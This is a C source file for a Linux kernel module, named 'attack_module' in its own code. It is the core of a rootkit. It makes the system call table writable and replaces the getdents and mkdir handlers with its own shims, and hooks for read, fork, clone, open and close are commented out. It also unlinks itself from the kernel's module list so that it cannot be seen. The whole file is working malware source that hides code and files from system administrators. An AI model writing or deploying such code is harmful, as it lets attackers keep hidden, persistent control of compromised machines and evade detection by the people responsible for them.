#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "hiddenDirectories.h"
#include "bootprocess.h"

//new system calls
#include "getdentsShim.h"
#include "readShim.h"
#include "mkdirShim.h"
#include "forkShim.h"
#include "shimOpenClose.h"

MODULE_LICENSE("GPL");

syscall backup_sys_call_table[SYS_TABLE_LENGTH];
vector hiddenDirectories;

void patch(int callnum, void* newcall) {
	sys_call_table[callnum] = (syscall)newcall;
}

void unpatch(int callnum) {
	sys_call_table[callnum] = backup_sys_call_table[callnum];
}

int init_module() {
	int bootresult;
	struct module* this_mod;
	preempt_disable();
	printk(KERN_INFO "Attempting to initialize attack module.\n");
	hiddenDirectories = vector_init();
	make_rw(sys_call_table);
	//make a backup of the system call table
	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));

	//start up the payload
	//this has been changed, the payload now starts the rootkit
	//bootresult = bootprocess();
	//if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);

	//shim the syscalls. 
	patch(SYS_getdents, getdentsShim);
	//patch(SYS_read, readShim);
	patch(SYS_mkdir, mkdirShim);
	//patch(SYS_fork, forkShim);
	//patch(SYS_clone, cloneShim);
	//patch(SYS_open, openShim);
	//patch(SYS_close, closeShim);

	//request module and payload to be hidden
	//These are now done by the payload
	//hideDirectory(secret_ko_name);
	//hideDirectory(secret_payload_name);

	//hide this module from the list
	mutex_lock(&module_mutex);
	this_mod = find_module("attack_module"); //it turns out the name attack_module is part of the binary, not the filename
	if (this_mod) {
		printk(KERN_INFO "found module, hiding\n");
		list_del_rcu(&this_mod->list);
	}
	else {
		printk(KERN_INFO "could not find module\n");
	}
	mutex_unlock(&module_mutex);

	printk(KERN_INFO "Module loaded\n");
	preempt_enable();
	return 0;
}

void cleanup_module() {
	//Make sure this function can safely be called multiple times.
	//The API can be called to deactivate the module.

	//restore the system call table, in reverse order
	//unpatch(SYS_close);
	//unpatch(SYS_open);
	//unpatch(SYS_clone);
	//unpatch(SYS_fork);
	unpatch(SYS_mkdir);
	//unpatch(SYS_read);
	unpatch(SYS_getdents);
	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
	if (hiddenDirectories) {
		vector_free(hiddenDirectories);
		hiddenDirectories = 0;
	}
	printk(KERN_INFO "Module unloaded\n");
}
